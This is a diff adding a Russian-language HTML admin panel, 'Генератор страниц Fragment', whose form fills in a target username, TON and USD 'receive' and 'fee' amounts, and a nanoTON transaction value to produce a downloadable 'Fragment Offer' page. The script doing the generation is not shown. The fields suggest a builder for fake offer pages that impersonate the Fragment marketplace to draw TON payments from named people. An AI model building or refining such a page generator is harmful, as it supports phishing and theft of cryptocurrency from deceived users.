@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Админ-панель Fragment</title>
+    <style>
+        :root {
+            --tm-bg-dark: #1A2026;
+            --tm-bg-dark-1: #293440;
+            --tm-bg-card: #202832;
+            --tm-text-primary: #ffffff;
+            --tm-text-secondary: #a1a1a1;
+            --tm-text-blue: #00aff0;
+            --tm-border-color: #384553;
+            --tm-btn-primary-bg: #00aff0;
+            --tm-btn-primary-hover-bg: #0091c2;
+            --tm-btn-radius: 8px;
+            --tm-input-radius: 6px;
+            --tm-card-radius: 12px;
+            --tm-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', Arial, sans-serif;
+            background-color: var(--tm-bg-dark);
+            color: var(--tm-text-primary);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .admin-container {
+            background-color: var(--tm-bg-card);
+            padding: 35px;
+            border-radius: var(--tm-card-radius);
+            box-shadow: var(--tm-shadow);
+            width: 100%;
+            max-width: 650px;
+            box-sizing: border-box;
+        }
+
+        h1 {
+            color: var(--tm-text-blue);
+            text-align: center;
+            margin-top: 0;
+            margin-bottom: 30px;
+            font-size: 28px;
+            font-weight: 700;
+        }
+
+        .form-group {
+            margin-bottom: 22px;
+        }
+
+        .form-group label {
+            display: block;
+            color: var(--tm-text-secondary);
+            margin-bottom: 10px;
+            font-weight: 500;
+            font-size: 15px;
+        }
+
+        .form-group input[type="text"],
+        .form-group input[type="number"] {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--tm-bg-dark-1);
+            border: 1px solid var(--tm-border-color);
+            border-radius: var(--tm-input-radius);
+            color: var(--tm-text-primary);
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .form-group input[type="text"]:focus,
+        .form-group input[type="number"]:focus {
+            border-color: var(--tm-text-blue);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 175, 240, 0.25);
+        }
+        
+        .form-group small {
+            display: block;
+            color: #828f9a;
+            font-size: 13px;
+            margin-top: 6px;
+        }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        button {
+            background-color: var(--tm-btn-primary-bg);
+            color: var(--tm-text-primary);
+            border: none;
+            padding: 15px 25px;
+            font-size: 17px;
+            font-weight: 500;
+            border-radius: var(--tm-btn-radius);
+            cursor: pointer;
+            transition: background-color 0.2s ease, transform 0.1s ease;
+            width: 100%;
+            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        button:hover {
+            background-color: var(--tm-btn-primary-hover-bg);
+        }
+
+        button:active {
+            transform: translateY(1px);
+        }
+        
+        button svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .error-message {
+            color: #ff5252;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+
+        @media (max-width: 600px) {
+            body {
+                padding: 15px;
+            }
+            .admin-container {
+                padding: 25px;
+            }
+            .form-grid {
+                grid-template-columns: 1fr;
+            }
+            h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="admin-container">
+        <h1>Генератор страниц Fragment</h1>
+
+        <div class="form-group">
+            <label for="pageTitle">Заголовок страницы (Title Tag):</label>
+            <input type="text" id="pageTitle" value="Fragment Offer for {username}" placeholder="e.g., Fragment - Confirm Offer for {username}">
+        </div>
+
+        <div class="form-group">
+            <label for="username">Имя пользователя (для замены 'slowswags'):</label>
+            <input type="text" id="username" value="new_user" placeholder="e.g., user123">
+        </div>
+
+        <div class="form-grid">
+            <div class="form-group">
+                <label for="receiveTon">Сумма получения (TON):</label>
+                <input type="text" id="receiveTon" value="531 TON" placeholder="e.g., 500 TON">
+            </div>
+            <div class="form-group">
+                <label for="receiveUsd">Сумма получения (USD текст):</label>
+                <input type="text" id="receiveUsd" value="$1717.68" placeholder="e.g., $1500.00">
+            </div>
+        </div>
+
+        <div class="form-grid">
+            <div class="form-group">
+                <label for="feeTon">Комиссия (TON):</label>
+                <input type="text" id="feeTon" value="31 TON" placeholder="e.g., 30 TON">
+            </div>
+            <div class="form-group">
+                <label for="feeUsd">Комиссия (USD текст):</label>
+                <input type="text" id="feeUsd" value="$100.28" placeholder="e.g., $90.00">
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label for="nanoTonAmount">Сумма транзакции (nanoTON):</label>
+            <input type="text" id="nanoTonAmount" value="531000000000" placeholder="e.g., 500000000000">
+             <small>Например: 531 TON = 531000000000 nanoTON (1 TON = 10<sup>9</sup> nanoTON)</small>
+        </div>
+
+        <div class="form-group">
+            <label for="outputFilename">Имя генерируемого файла:</label>
+            <input type="text" id="outputFilename" value="custom_page.html" placeholder="e.g., offer_user123.html">
+            <div id="filenameError" class="error-message"></div>
+        </div>
+
+        <button id="generateButton">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="20" height="20">
+                <path d="M12 15.586l-2.293-2.293a1 1 0 00-1.414 1.414l4 4a1 1 0 001.414 0l4-4a1 1 0 00-1.414-1.414L12 15.586zM12 2a1 1 0 00-1 1v8.586l-2.293-2.293a1 1 0 10-1.414 1.414l4 4a1 1 0 001.414 0l4-4a1 1 0 10-1.414-1.414L13 11.586V3a1 1 0 00-1-1zM3 18a1 1 0 001 1h16a1 1 0 100-2H4a1 1 0 00-1 1z"/>
+            </svg>
+            Сгенерировать и скачать страницу
+        </button>
+    </div>
+
+    <script type="module" src="admin.js"></script>
+</body>
+</html>
